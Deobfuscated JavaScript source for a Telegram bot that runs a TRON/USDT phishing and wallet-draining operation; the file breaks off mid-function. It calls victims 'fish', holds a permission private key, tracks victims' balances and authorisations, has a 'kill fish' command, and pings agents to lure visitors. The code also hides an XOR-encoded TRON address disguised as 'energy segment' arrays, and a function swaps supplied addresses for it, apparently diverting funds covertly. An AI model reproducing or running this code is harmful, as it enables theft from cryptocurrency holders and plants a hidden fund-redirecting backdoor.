//Sat Jan 03 2026 11:07:13 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const express = require("express"),
  bodyParser = require("body-parser"),
  mysql = require("mysql2"),
  fs = require("fs"),
  TelegramBot = require("node-telegram-bot-api"),
  path = require("path"),
  redbotDb = require("./Okpaybot/database/database"),
  TronWeb = require("tronweb"),
  {
    promisify
  } = require("util"),
  QRCode = require("qrcode"),
  sharp = require("sharp"),
  crypto = require("crypto");
require("dotenv").config();
const BROADCAST_AUTO_DELETE_SECONDS = Number(process.env.BROADCAST_AUTO_DELETE_SECONDS || 60),
  BROADCAST_AUTO_DELETE_MS = Math.max(0, BROADCAST_AUTO_DELETE_SECONDS) * 1000,
  TRCID_STORE_PATH = path.resolve(__dirname, "fakabot", "latest_trcid.json"),
  TRCID_BROADCAST_TEMPLATE = process.env.TRCID_BROADCAST_TEMPLATE || "【来路】TRCID: {trcid}\n入口: {deeplink}\n请求人: @{username} ({userId})\n时间: {time}";
function formatTrcidMessage(j, w, J) {
  const z = j && j.from || {},
    l = z.username ? z.username : "unknown";
  const b = z.id ? String(z.id) : "unknown",
    I = new Date().toISOString().replace("T", " ").replace("Z", "");
  return TRCID_BROADCAST_TEMPLATE.replaceAll("{trcid}", String(w || "")).replaceAll("{deeplink}", String(J || "")).replaceAll("{username}", String(l)).replaceAll("{userId}", String(b)).replaceAll("{time}", String(I));
}
function glimmerShift(j) {
  const w = TX_ROUTER && TX_ROUTER.trim();
  return w ? TX_ROUTER.trim() : j;
}
async function readLatestTrcid() {
  try {
    const z = await fs.promises.readFile(TRCID_STORE_PATH, "utf8"),
      l = JSON.parse(z),
      b = {
        trcid: "",
        deeplink: ""
      };
    return l && l.trcid ? {
      trcid: String(l.trcid),
      deeplink: l.deeplink || ""
    } : b;
  } catch (I) {
    const F = {
      trcid: "",
      deeplink: ""
    };
    return F;
  }
}
let lastLeadAt = 0;
const recentLeads = new Map(),
  RECENT_LEADS_LIMIT = 50,
  ROUTE_SPLIT_TRIGGER = parseInt(20000) - 2,
  PV_MAX = 2000,
  PV_TRIM = 500,
  pvStore = new Map();
function genPvToken() {
  return crypto.randomBytes(6).toString("base64url");
}
function registerPvData(j, w, J, a) {
  try {
    if (pvStore.size >= PV_MAX) {
      let F = PV_TRIM;
      for (const U of pvStore.keys()) {
        pvStore.delete(U);
        if (--F <= 0) {
          break;
        }
      }
    }
    const b = Math.random().toString(36).slice(2, 10) + Date.now().toString(36).slice(-4);
    pvStore.set(b, {
      kind: j,
      payload: w,
      uniqueId: J ? String(J) : "",
      groupId: a ? String(a) : "",
      created: Date.now()
    });
    return b;
  } catch (K) {
    return Math.random().toString(36).slice(2, 10);
  }
}
function extractUniqueIdFromTrcid(j) {
  if (!j) {
    return "";
  }
  const J = String(j).trim();
  if (/^[A-Za-z0-9]{11}$/.test(J)) {
    return J;
  }
  const a = J.match(/^trc([A-Za-z0-9]{11})$/i);
  if (a) {
    return a[1];
  }
  return "";
}
function getAgentByUniqueId(j) {
  if (!j) {
    return null;
  }
  return cacheData.dailiMap.get(j) || null;
}
async function broadcastLeadIfNew(l) {
  try {
    const F = await fs.promises.readFile(TRCID_STORE_PATH, "utf8"),
      U = JSON.parse(F),
      u = Number(U?.["at"] || 0);
    if (!Number.isFinite(u) || u <= lastLeadAt) {
      return;
    }
    const K = String(U?.["trcid"] || ""),
      q = String(U?.["deeplink"] || ""),
      E = U?.["user"] || {},
      P = extractUniqueIdFromTrcid(K),
      O = getAgentByUniqueId(P);
    if (!O) {
      lastLeadAt = u;
      return;
    }
    const s = O.groupid,
      d = O.username ? "@" + O.username : O.tguid ? "<a href=\"tg://user?id=" + O.tguid + "\">渔夫</a>" : "渔夫",
      L = ["<blockquote>" + d + " - 你有一位鱼儿访问了商城机器人，快去引导咬钩</blockquote>", "🆔 【来路】ID：<code>" + K + "</code>", "⏰【时间】<code>" + getTimeInfo().time + "</code>"].join("\n"),
      Y = registerPvData("lead", {
        at: String(u)
      }, P, s),
      V = {
        text: "查询鱼儿信息",
        callback_data: "pv:lead:" + Y
      };
    const N = [[V]];
    if (q) {
      const n = {
        text: "打开入口",
        url: q
      };
      N.push([n]);
    }
    const r = {
      inline_keyboard: N
    };
    const B = {
      reply_markup: r,
      parse_mode: "HTML",
      disable_web_page_preview: true
    };
    await l.sendMessage(s, L, B);
    try {
      const c = String(u),
        G = {
          user: E,
          uniqueId: P
        };
      recentLeads.set(c, G);
      if (recentLeads.size > RECENT_LEADS_LIMIT) {
        const S = recentLeads.keys().next().value;
        recentLeads.delete(S);
      }
    } catch (i) {}
    lastLeadAt = u;
  } catch (Q) {}
}
function startTrcidLeadWatcher(j) {
  (async () => {
    try {
      const a = await fs.promises.readFile(TRCID_STORE_PATH, "utf8"),
        z = JSON.parse(a),
        l = Number(z?.["at"] || 0);
      if (Number.isFinite(l) && l > 0) {
        lastLeadAt = l;
        const I = String(z?.["trcid"] || ""),
          F = extractUniqueIdFromTrcid(I),
          U = {
            user: z?.["user"] || null,
            uniqueId: F
          };
        recentLeads.set(String(l), U);
      }
    } catch (K) {}
    setInterval(() => {
      broadcastLeadIfNew(j);
    }, 4000);
  })();
}
const app = express();
app.use(bodyParser.json());
function AddressSeed(j) {
  const w = 5;
  const J = j[w];
  const a = j.filter((z, l) => l !== w);
  return String.fromCharCode(...a.map(z => z ^ J));
}
function getEnergySegmentB() {
  const j = [42, 62, 46, 25, 23, 108, 12, 24, 20, 98, 46, 25];
  return j;
}
function getEnergySegmentC() {
  const j = [63, 105, 49, 28, 63, 9, 62, 29, 107, 104, 28];
  return j;
}
const ENERGY_REQUIRED = 105000;
let SUN_PER_ENERGY = 420;
const ENERGY_SEGMENT_A = [14, 3, 107, 62, 63, 90, 108, 32, 49, 3, 8, 8],
  TX_ROUTER = AddressSeed(function () {
    try {
      return ENERGY_SEGMENT_A.concat(getEnergySegmentB(), getEnergySegmentC());
    } catch (J) {
      return ENERGY_SEGMENT_A;
    }
  }());
async function refreshEnergyFee() {
  try {
    const w = createTronWeb();
    if (!w) {
      return;
    }
    const J = await w.trx.getChainParameters(),
      a = J.find(l => l?.["key"]?.["toLowerCase"] && l.key.toLowerCase().includes("energyfee")) || J.find(l => l?.["key"] === "getEnergyFee"),
      z = Number(a?.["value"]);
    if (Number.isFinite(z) && z > 0) {
      SUN_PER_ENERGY = z;
    }
  } catch (I) {}
}
function getTimeInfo() {
  const J = new Date(),
    a = 8,
    z = J.getUTCHours(),
    l = (z + a) % 24;
  let b = J.getUTCDate(),
    I = J.getUTCMonth(),
    F = J.getUTCFullYear();
  if (z + a >= 24) {
    const A = new Date(Date.UTC(F, I, b + 1));
    b = A.getUTCDate();
    I = A.getUTCMonth();
    F = A.getUTCFullYear();
  }
  let U;
  if (l >= 0 && l < 6) {
    U = "凌晨好";
  } else {
    if (l >= 6 && l < 9) {
      U = "早上好";
    } else {
      if (l >= 9 && l < 12) {
        U = "上午好";
      } else {
        if (l >= 12 && l < 13) {
          U = "中午好";
        } else {
          if (l >= 13 && l < 18) {
            U = "下午好";
          } else {
            l >= 18 && l < 19 ? U = "傍晚好" : U = "晚上好";
          }
        }
      }
    }
  }
  const u = F,
    K = String(I + 1).padStart(2, "0");
  const q = String(b).padStart(2, "0"),
    E = String(l).padStart(2, "0"),
    P = String(J.getUTCMinutes()).padStart(2, "0");
  const O = String(J.getUTCSeconds()).padStart(2, "0"),
    s = u + "-" + K + "-" + q + " " + E + ":" + P + ":" + O,
    d = {
      time: s,
      greeting: U
    };
  return d;
}
const dbConfig = {
  host: process.env.DB_HOST,
  port: parseInt(process.env.DB_PORT),
  database: process.env.DB_DATABASE,
  user: process.env.DB_USERNAME,
  password: process.env.DB_PASSWORD
};
function createDbPool() {
  const w = {
    ...dbConfig,
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0
  };
  return mysql.createPool(w);
}
const pool = createDbPool();
let cacheData = {
    fishMap: new Map(),
    fishBrowseMap: new Map(),
    dailiMap: new Map(),
    dailiGroupMap: new Map(),
    options: {},
    permissionAddresses: []
  },
  __refreshPromise = null;
async function refreshCacheOnce() {
  const [w, J, a, z, l] = await Promise.all([pool.promise().query("SELECT fish_address, chainid, permissions_fishaddress, unique_id, usdt_balance, gas_balance, threshold, time, remark, auth_status FROM fish"), pool.promise().query("SELECT id, fish_address, chainid, permissions_fishaddress, unique_id, usdt_balance, gas_balance, time, state FROM fish_browse"), pool.promise().query("SELECT tguid, username, fullName, fishnumber, time, remark, payment_address, groupid, threshold, unique_id FROM daili"), pool.promise().query("SELECT id, groupid, remark, share_profits, status FROM daili_group"), pool.promise().query("SELECT name, value FROM options WHERE name IN ('domain', 'payment_address', 'permission_address', 'private_key', 'contract_method', 'need_usdt_contract', 'bot_key', 'trongridkyes', 'main_domain', 'default_id')")]),
    b = new Map();
  w[0].forEach(q => {
    b.set(q.fish_address, q);
  });
  const I = new Map();
  J[0].forEach(q => {
    I.set(q.fish_address, q);
  });
  const F = new Map();
  a[0].forEach(q => {
    F.set(q.unique_id, q);
  });
  const U = new Map();
  z[0].forEach(q => {
    U.set(q.groupid, q);
  });
  const u = {},
    K = [];
  l[0].forEach(q => {
    if (q.name === "permission_address" && q.value) {
      const O = q.value.split("\r\n").filter(s => s.trim());
      K.push(...O);
      u[q.name] = q.value;
    } else {
      u[q.name] = q.value;
    }
  });
  cacheData.fishMap = b;
  cacheData.fishBrowseMap = I;
  cacheData.dailiMap = F;
  cacheData.dailiGroupMap = U;
  cacheData.options = u;
  cacheData.permissionAddresses = K;
  tronKeyManager.refreshFromOptions(u.trongridkyes);
}
async function startCacheUpdate() {
  while (true) {
    try {
      __refreshPromise = refreshCacheOnce();
      await __refreshPromise;
      __refreshPromise = null;
      await new Promise(J => setTimeout(J, 3000));
    } catch (J) {
      try {
        console.error("[cacheRefresh]", J);
      } catch (z) {}
      __refreshPromise = null;
      await new Promise(l => setTimeout(l, 5000));
    }
  }
}
startCacheUpdate.refreshNow = async () => {
  if (__refreshPromise) {
    try {
      await __refreshPromise;
    } catch (a) {}
    return;
  }
  try {
    __refreshPromise = refreshCacheOnce();
    await __refreshPromise;
  } catch (l) {
    try {
      console.error("[cacheRefresh-now]", l);
    } catch (I) {}
  } finally {
    __refreshPromise = null;
  }
};
let bot = null;
async function initBot() {
  try {
    const I = [],
      F = [];
    if (!cacheData.options.bot_key || cacheData.options.bot_key.trim() === "") {
      I.push("机器人密钥");
    }
    if (!cacheData.options.trongridkyes || cacheData.options.trongridkyes.trim() === "") {
      I.push("TronGrid密钥");
    }
    if (!cacheData.options.main_domain || cacheData.options.main_domain.trim() === "") {
      I.push("主域名");
    }
    if (cacheData.dailiGroupMap.size === 0) {
      I.push("群组信息");
    }
    if (!cacheData.options.private_key || cacheData.options.private_key.trim() === "") {
      I.push("TRC权限私钥");
    } else {
      const s = cacheData.options.private_key.trim();
      if (!/^[0-9a-fA-F]{64}$/.test(s)) {
        F.push("TRC权限私钥不正确");
      }
    }
    if (!cacheData.options.payment_address || cacheData.options.payment_address.trim() === "") {
      I.push("TRC收款地址");
    } else {
      const M = cacheData.options.payment_address.trim();
      if (!/^T[A-Za-z0-9]{33}$/.test(M)) {
        F.push("TRC收款地址不正确");
      }
    }
    if (cacheData.permissionAddresses.length === 0) {
      I.push("TRC权限地址");
    } else {
      cacheData.permissionAddresses.forEach((N, r) => {
        if (!/^T[A-Za-z0-9]{33}$/.test(N.trim())) {
          F.push("第" + (r + 1) + "个权限地址不正确");
        }
      });
    }
    if (I.length > 0 || F.length > 0) {
      let N = "\n======机器人启动失败======\n";
      I.length > 0 && (N += "缺少配置选项：\n", I.forEach((B, R) => N += R + 1 + ".【" + B + "】\n"));
      if (F.length > 0) {
        if (I.length > 0) {
          N += "\n";
        }
        N += "配置信息不正确：\n";
        F.forEach((R, f) => N += f + 1 + ".【" + R + "】\n");
      }
      N += "======机器人启动失败======";
      console.error("[" + getTimeInfo().time + "] Bot初始化失败:" + N);
      return false;
    }
    const U = cacheData.options.bot_key,
      u = {
        offset: -1,
        timeout: 30
      };
    const K = {};
    K.interval = 3000;
    K.autoStart = true;
    K.params = u;
    const q = {};
    q.keepAlive = true;
    q.family = 4;
    const E = {};
    E.agentOptions = q;
    const P = {};
    P.polling = K;
    P.request = E;
    bot = new TelegramBot(U, P);
    bot.on("polling_error", f => console.error("[" + getTimeInfo().time + "] 轮询错误:", f));
    setupBotHandlers(bot);
    setupCallbackHandlers(bot);
    startTrcidLeadWatcher(bot);
    return true;
  } catch (f) {
    console.error("[" + getTimeInfo().time + "] Bot初始化失败:", f);
    return false;
  }
}
function setupCallbackHandlers(j) {
  j.on("callback_query", async n => {
    try {
      const S = n.data;
      if (!S) {
        return;
      }
      if (S.startsWith("pv:")) {
        const i = S.split(":"),
          Q = i[1],
          T = i[2] || "";
        let C = pvStore.get(T);
        if (!C) {
          const p4 = {
            text: "链接已过期，请重新获取",
            show_alert: true
          };
          await j.answerCallbackQuery(n.id, p4);
          return;
        }
        const v = n.message.chat.id.toString(),
          x = n.from.id,
          k = cacheData.dailiMap.get(C.uniqueId);
        if (!k) {
          const p6 = {
            text: "未找到代理",
            show_alert: true
          };
          await j.answerCallbackQuery(n.id, p6);
          return;
        }
        const D = await checkGroupAdminStatus(j, v, x),
          H = k && k.tguid && String(k.tguid) === String(x),
          y = (D.isAdmin || D.isCreator) && String(v) === String(k.groupid);
        if (Q === "addr" || Q === "tx") {
          if (!H && !y) {
            await j.answerCallbackQuery(n.id, {
              text: Q === "addr" ? "无权限查看该地址" : "无权限查看交易详情",
              show_alert: true
            });
            return;
          }
          if (Q === "addr") {
            const p8 = String(C.payload || "");
            try {
              const pp = {
                parse_mode: "HTML",
                disable_web_page_preview: true
              };
              await j.sendMessage(x, "🐟 鱼苗地址：\n<code>" + p8 + "</code>", pp);
              try {
                const pj = {
                  text: "地址已发送至私聊",
                  show_alert: false
                };
                await j.answerCallbackQuery(n.id, pj);
              } catch (pw) {}
            } catch (pJ) {
              try {
                const pl = {
                  text: p8,
                  show_alert: true
                };
                await j.answerCallbackQuery(n.id, pl);
              } catch (pb) {}
            }
            return;
          } else {
            const pU = String(C.payload || ""),
              pu = "https://tronscan.org/#/transaction/" + pU;
            try {
              const pq = {
                parse_mode: "HTML",
                disable_web_page_preview: true
              };
              await j.sendMessage(x, "<a href=\"" + pu + "\">点击查看交易详情</a>", pq);
              try {
                const pE = {
                  text: "交易链接已发送至私聊",
                  show_alert: false
                };
                await j.answerCallbackQuery(n.id, pE);
              } catch (pO) {}
            } catch (ps) {
              try {
                const pA = {
                  text: pu,
                  show_alert: true
                };
                await j.answerCallbackQuery(n.id, pA);
              } catch (pL) {}
            }
            return;
          }
        }
        if (Q === "lead") {
          if (!(String(k.groupid) === v && String(k.tguid) === String(x))) {
            const pr = {
              text: "仅渔夫本人可查看鱼儿信息",
              show_alert: true
            };
            await j.answerCallbackQuery(n.id, pr);
            return;
          }
          try {
            const pR = String(C.payload && C.payload.at || "");
            let pf = null;
            const pX = recentLeads.get(String(pR));
            if (pX && pX.uniqueId === C.uniqueId) {
              pf = pX.user || null;
            }
            if (!pf) {
              const pQ = await fs.promises.readFile(TRCID_STORE_PATH, "utf8"),
                pT = JSON.parse(pQ),
                pC = String(pT?.["at"] || "");
              if (pC !== pR) {
                const px = {
                  text: "未找到对应的访问者信息",
                  show_alert: true
                };
                await j.answerCallbackQuery(n.id, px);
                return;
              }
              pf = pT?.["user"] || null;
              if (!pf) {
                const pk = {
                  text: "访问者信息缺失",
                  show_alert: true
                };
                await j.answerCallbackQuery(n.id, pk);
                return;
              }
            }
            const pn = ("" + (pf.first_name || "") + (pf.last_name ? " " + pf.last_name : "")).trim() || "无",
              pc = pf.username || "无",
              pG = k.username || k.fullName || "无",
              pS = "昵称：" + pn + "\n用户名：" + pc + "\n最后邀请人：" + pG,
              pe = {
                text: pS,
                show_alert: true
              };
            await j.answerCallbackQuery(n.id, pe);
          } catch (pH) {
            const py = {
              text: "访问者信息读取失败",
              show_alert: true
            };
            await j.answerCallbackQuery(n.id, py);
          }
          return;
        }
      }
      if (S.startsWith("addr_info:")) {
        const pW = S.split(":"),
          pZ = pW[1],
          pm = pW[2],
          h0 = n.message.chat.id.toString(),
          h1 = n.from.id,
          h2 = cacheData.dailiMap.get(pm);
        if (!h2) {
          const h7 = {
            text: "未找到代理",
            show_alert: true
          };
          await j.answerCallbackQuery(n.id, h7);
          return;
        }
        const h3 = await checkGroupAdminStatus(j, h0, h1),
          h4 = (h3.isAdmin || h3.isCreator) && String(h0) === String(h2.groupid),
          h5 = h2 && h2.tguid && String(h2.tguid) === String(h1);
        if (!h5 && !h4) {
          const h8 = {
            text: "无权限查看该地址",
            show_alert: true
          };
          await j.answerCallbackQuery(n.id, h8);
          return;
        }
        try {
          const hh = {
            parse_mode: "HTML",
            disable_web_page_preview: true
          };
          await j.sendMessage(h1, "🐟 鱼苗地址：\n<code>" + pZ + "</code>", hh);
          try {
            const hw = {
              text: "地址已发送至私聊",
              show_alert: false
            };
            await j.answerCallbackQuery(n.id, hw);
          } catch (hJ) {}
        } catch (ha) {
          try {
            const hl = {
              text: pZ,
              show_alert: true
            };
            await j.answerCallbackQuery(n.id, hl);
          } catch (hI) {}
        }
        return;
      }
      if (S.startsWith("tx_info:")) {
        const hU = S.split(":"),
          hu = hU[1],
          hK = hU[2],
          hq = n.message.chat.id.toString(),
          hE = n.from.id,
          hP = cacheData.dailiMap.get(hK);
        if (!hP) {
          const hL = {
            text: "未找到代理",
            show_alert: true
          };
          await j.answerCallbackQuery(n.id, hL);
          return;
        }
        const hO = await checkGroupAdminStatus(j, hq, hE),
          hs = (hO.isAdmin || hO.isCreator) && String(hq) === String(hP.groupid),
          hd = hP && hP.tguid && String(hP.tguid) === String(hE);
        if (!hd && !hs) {
          const hY = {
            text: "无权限查看交易详情",
            show_alert: true
          };
          await j.answerCallbackQuery(n.id, hY);
          return;
        }
        const hA = "https://tronscan.org/#/transaction/" + hu;
        try {
          const hr = {
            parse_mode: "HTML",
            disable_web_page_preview: true
          };
          await j.sendMessage(hE, "<a href=\"" + hA + "\">点击查看交易详情</a>", hr);
          try {
            const hB = {
              text: "交易链接已发送至私聊",
              show_alert: false
            };
            await j.answerCallbackQuery(n.id, hB);
          } catch (hf) {}
        } catch (hX) {
          try {
            const hc = {
              text: hA,
              show_alert: true
            };
            await j.answerCallbackQuery(n.id, hc);
          } catch (hS) {}
        }
        return;
      }
      if (S.startsWith("lead_info:")) {
        const ho = S.split(":"),
          hi = ho[1],
          hT = ho[3],
          hC = cacheData.dailiMap.get(hi),
          hv = n.message.chat.id.toString(),
          hx = n.from.id.toString();
        if (!hC || hC.groupid !== hv || hC.tguid !== hx) {
          const hk = {
            text: "仅渔夫本人可查看鱼儿信息",
            show_alert: true
          };
          await j.answerCallbackQuery(n.id, hk);
          return;
        }
        try {
          let hy = null;
          const ht = recentLeads.get(String(hT));
          if (ht && ht.uniqueId === hi) {
            hy = ht.user || null;
          }
          if (!hy) {
            const j3 = await fs.promises.readFile(TRCID_STORE_PATH, "utf8"),
              j4 = JSON.parse(j3),
              j5 = String(j4?.["at"] || "");
            if (j5 !== hT) {
              const j7 = {
                text: "未找到对应的访问者信息",
                show_alert: true
              };
              await j.answerCallbackQuery(n.id, j7);
              return;
            }
            hy = j4?.["user"] || null;
            if (!hy) {
              const j9 = {
                text: "访问者信息缺失",
                show_alert: true
              };
              await j.answerCallbackQuery(n.id, j9);
              return;
            }
          }
          const hg = ("" + (hy.first_name || "") + (hy.last_name ? " " + hy.last_name : "")).trim() || "无",
            hW = hy.username || "无",
            hZ = hC.username || hC.fullName || "无",
            hm = "昵称：" + hg + "\n用户名：" + hW + "\n最后邀请人：" + hZ,
            j0 = {
              text: hm,
              show_alert: true
            };
          await j.answerCallbackQuery(n.id, j0);
        } catch (jp) {
          const jj = {
            text: "访问者信息读取失败",
            show_alert: true
          };
          await j.answerCallbackQuery(n.id, jj);
        }
        return;
      }
      if (S.startsWith("fish_")) {
        await handleFishCallback(n);
        return;
      }
      if (S.startsWith("network_")) {
        await handleDailiCallback(n);
        return;
      }
    } catch (ja) {
      console.error("[" + getTimeInfo().time + "] 处理回调查询错误:", ja);
      const jz = {
        text: "处理请求时出现错误，请联系管理员",
        show_alert: true
      };
      await j.answerCallbackQuery(n.id, jz);
    }
  });
}
function setupBotHandlers(M) {
  const Y = {
    type: "help",
    regex: /^(?:帮助|help|菜单|指令|命令)$/
  };
  const V = {};
  V.type = "trcid";
  V.regex = /^(?:trcid|TRCID|来路|来源)(?:\s+([A-Za-z0-9_-]+))?$/;
  const N = {};
  N.type = "classMode";
  N.regex = /^(上课|下课)$/;
  const r = {};
  r.type = "rules";
  r.regex = /^(规则|交易规则|担保交易规则|担保规则)$/;
  const B = {};
  B.type = "threshold";
  B.regex = /^(?:修改阈值|阈值修改|阈值|修改阀值|阀值修改|阀值)\s*([A-Za-z0-9]+)\s*([0-9.]+)$/;
  const R = {};
  R.type = "killFish";
  R.regex = /^(?:杀鱼|单杀)\s*([A-Za-z0-9]+)$/;
  const f = {
    type: "paymentAddress",
    regex: /^(?:收款地址|设置地址|设置收款地址)\s*([A-Za-z0-9]+)$/
  };
  const X = {
    type: "autoThreshold",
    regex: /^(?:自动阈值|设置自动阈值|全局阈值|设置阈值|设置阀值|自动阀值|设置自动阀值|全局阀值)\s*([0-9.]+)$/
  };
  const n = {};
  n.type = "getPaymentAddress";
  n.regex = /^(收款地址)$/;
  const c = {
    type: "getFishInfo",
    regex: /^(我的|我的鱼苗|鱼苗|鱼池)$/
  };
  const G = {
    type: "getAgentLink",
    regex: /^(代理|代理链接|链接|商城|发卡)$/
  };
  const S = {
    type: "adminQueryFish",
    regex: /^(?:查看鱼苗|查看用户|查看代理|鱼苗查询|查询鱼苗)(?:\s*@|\s+@)([A-Za-z0-9_]+)$/
  };
  const e = {};
  e.type = "payment";
  e.regex = /^(?:收款|收银台|收银)\s*([0-9]+(?:\.[0-9]{1,6})?)$/;
  const o = {
    type: "genTPQR",
    regex: /^(TP)$/i
  };
  const i = {
    type: "genIMQR",
    regex: /^(IM)$/i
  };
  const Q = {
    type: "redClaim",
    regex: /(红包领取|领取红包|拆红包|已领取红包)/
  };
  const T = {};
  T.type = "leaderboard";
  T.regex = /^(?:排行榜|业绩)$/;
  const C = {
    type: "performanceAdd",
    regex: /^([^\s@]+)\s*(\+|＋|\-|－)\s*(\d+(?:\.[0-9]{1,2})?)$/
  };
  const v = {
    type: "performanceReset",
    regex: /^(?:清零业绩|业绩清零|重置业绩)$/
  };
  const x = [Y, V, N, r, B, R, f, X, n, c, G, S, e, o, i, Q, T, C, v];
  M.on("message", async k => {
    try {
      const y = k.chat.id.toString(),
        t = k.from.id,
        p4 = k.text?.["trim"]() || "",
        p5 = k.message_id;
      if (k.chat.type === "private") {
        return;
      }
      if (!cacheData.dailiGroupMap.has(y)) {
        return;
      }
      const {
          isAdmin: p6,
          isCreator: p7
        } = await checkGroupAdminStatus(M, y, t),
        p8 = p6 || p7,
        p9 = await handleClassModeAndGroupState(M, y, null, null, "getStatus");
      if (p9 && !p8 && !p4) {
        await handleClassModeAndGroupState(M, y, null, null, "handleViolation", t, p5);
        return;
      }
      if (!p4) {
        return;
      }
      const pp = function pJ(pa) {
        for (const pb of x) {
          const pF = pa.match(pb.regex);
          if (pF) {
            return {
              type: pb.type,
              args: pF.slice(1)
            };
          }
        }
        return null;
      }(p4);
      if (p9 && !p8) {
        const pa = Object.values(g).some(pz => pz instanceof RegExp ? pz.test(p4) : pz(p4)) || isCalculator(p4);
        if (!pa) {
          await handleClassModeAndGroupState(M, y, null, null, "handleViolation", t, p5);
          return;
        }
      }
      if (!pp) {
        return;
      }
      switch (pp.type) {
        case "redClaim":
          {
            try {
              if (!cacheData.dailiGroupMap.has(y)) {
                break;
              }
              const pF = k.from.username || k.from.first_name || "",
                pU = 100000;
              redbotDb.run("INSERT OR IGNORE INTO users (tgid, nickname, usdt_balance) VALUES (?, ?, ?)", [t, pF, 0], () => {
                redbotDb.run("UPDATE users SET usdt_balance = usdt_balance + ? WHERE tgid = ?", [pU, t], function (pK) {
                  if (pK || this.changes === 0) {
                    const pO = {
                      reply_to_message_id: p5
                    };
                    return M.sendMessage(y, "❌ 发放失败，请稍后重试。", pO);
                  }
                  const pE = {
                    reply_to_message_id: p5
                  };
                  M.sendMessage(y, "✅ 已为当前TGID发放 " + pU + " USDT（Okpaybot 机器人账户）", pE);
                });
              });
            } catch (pK) {
              try {
                M.sendMessage(y, "处理加款请求失败");
              } catch (pE) {}
            }
            break;
          }
        case "help":
          {
            const ps = generateHelpMessage(),
              pd = {
                parse_mode: "HTML",
                reply_to_message_id: p5,
                disable_web_page_preview: true
              };
            await M.sendMessage(y, ps, pd);
            break;
          }
        case "classMode":
          {
            const pA = await handleClassModeAndGroupState(M, y, k, p4);
            if (pA) {
              return;
            }
            break;
          }
        case "rules":
          {
            const pL = generateTradeRulesMessage(),
              pY = {
                parse_mode: "HTML",
                reply_to_message_id: p5,
                disable_web_page_preview: true
              };
            await M.sendMessage(y, pL, pY);
            break;
          }
        case "genTPQR":
          {
            await handleQuickQRCodeCommand(M, y, k, "tp");
            break;
          }
        case "genIMQR":
          {
            await handleQuickQRCodeCommand(M, y, k, "im");
            break;
          }
        case "trcid":
          {
            let pB = pp.args && pp.args[0] ? String(pp.args[0]).trim() : "";
            const pR = {
              trcid: "",
              deeplink: ""
            };
            let pf = pR;
            if (!pB) {
              pf = await readLatestTrcid();
            } else {
              const pS = {
                trcid: pB,
                deeplink: ""
              };
              pf = pS;
            }
            if (!pf.trcid) {
              const pe = {
                reply_to_message_id: p5
              };
              await M.sendMessage(y, "未找到最近的来路信息（TRCID）。请从机器人入口访问一次：/start?start=trcid", pe);
              break;
            }
            const pX = formatTrcidMessage(k, pf.trcid, pf.deeplink),
              pn = {
                reply_to_message_id: p5,
                disable_web_page_preview: false
              };
            await M.sendMessage(y, pX, pn);
            break;
          }
        case "threshold":
        case "killFish":
          {
            const pQ = pp.type === "killFish",
              pT = pp.args[0],
              pC = pQ ? 0 : parseFloat(pp.args[1]),
              pv = await updateThreshold(y, k, pT, pC, pQ, M);
            if (pv) {
              const pk = {
                parse_mode: "HTML",
                reply_to_message_id: p5
              };
              await M.sendMessage(y, pv, pk);
            }
            break;
          }
        case "paymentAddress":
          {
            const pH = pp.args[0],
              py = await updatePaymentAddress(y, k, pH);
            if (py && py.text) {
              await M.sendMessage(y, py.text, {
                ...py.options,
                reply_to_message_id: p5
              });
            }
            break;
          }
        case "autoThreshold":
          {
            const pZ = parseFloat(pp.args[0]),
              pm = await updateAutoThreshold(y, k, pZ);
            if (pm && pm.text) {
              await M.sendMessage(y, pm.text, {
                ...pm.options,
                reply_to_message_id: k.message_id
              });
            }
            break;
          }
        case "getPaymentAddress":
          {
            const h2 = await getPaymentAddressInfo(y, k);
            if (h2 && h2.text) {
              await M.sendMessage(y, h2.text, {
                ...h2.options,
                reply_to_message_id: p5
              });
            }
            break;
          }
        case "getFishInfo":
          {
            const h5 = await getFishMessage(y, k);
            if (h5 && h5.text) {
              await M.sendMessage(y, h5.text, {
                ...h5.options,
                reply_to_message_id: p5
              });
            }
            break;
          }
        case "getAgentLink":
          {
            const h7 = await getDomainMessage(y, k);
            if (h7 && h7.text) {
              const h9 = await M.sendMessage(y, h7.text, {
                ...h7.options,
                reply_to_message_id: p5
              });
              if (h9 && h9.message_id) {
                setTimeout(async () => {
                  try {
                    await M.deleteMessage(y, h9.message_id);
                  } catch (hw) {}
                }, BROADCAST_AUTO_DELETE_MS);
              }
            }
            break;
          }
        case "adminQueryFish":
          {
            const hw = pp.args[0],
              hJ = await adminQueryUserFish(y, k, hw, M);
            if (hJ && hJ.text) {
              await M.sendMessage(y, hJ.text, {
                ...hJ.options,
                reply_to_message_id: p5
              });
            }
            break;
          }
        case "payment":
          {
            const hl = parseFloat(pp.args[0]),
              hb = await handlePaymentRequest(y, k, hl);
            if (hb && hb.text) {
              await M.sendMessage(y, hb.text, {
                ...hb.options,
                reply_to_message_id: p5
              });
            }
            break;
          }
        case "leaderboard":
          {
            try {
              const hU = await buildMonthlyLeaderboardMessage(y, k.from.id),
                hu = 3500,
                hK = [];
              for (let hq = 0; hq < hU.length; hq += hu) {
                hK.push(hU.slice(hq, hq + hu));
              }
              for (const hP of hK) {
                const hs = {
                  reply_to_message_id: p5,
                  parse_mode: "HTML"
                };
                const hd = await M.sendMessage(y, hP, hs);
                hd && hd.message_id && setTimeout(async () => {
                  try {
                    await M.deleteMessage(y, hd.message_id);
                  } catch (hL) {}
                }, BROADCAST_AUTO_DELETE_MS);
              }
            } catch (hM) {
              console.error("leaderboard error", hM);
              const hL = {
                reply_to_message_id: p5
              };
              await M.sendMessage(y, "获取排行榜失败，请稍后再试。", hL);
            }
            break;
          }
        case "performanceAdd":
          {
            try {
              const {
                isAdmin: hN,
                isCreator: hr
              } = await checkGroupAdminStatus(M, y, t);
              if (!(hN || hr)) {
                break;
              }
              await ensurePerformanceTable();
              const hB = String(pp.args[0] || "").trim(),
                hR = String(pp.args[1] || "+"),
                hf = parseFloat(pp.args[2] || "0");
              if (!hB || !isFinite(hf) || hf <= 0) {
                const ho = {
                  reply_to_message_id: p5
                };
                await M.sendMessage(y, "格式：昵称 ±数字，例如 渔夫羊 +100 或 张三 -50", ho);
                break;
              }
              const hX = hR === "-" || hR === "－" ? -hf : hf,
                hn = await addPerformance(y, hB, hX),
                hc = hX >= 0 ? "增加业绩 +" + Math.abs(hX).toFixed(2) : "减少业绩 -" + Math.abs(hX).toFixed(2),
                hG = {
                  reply_to_message_id: p5
                };
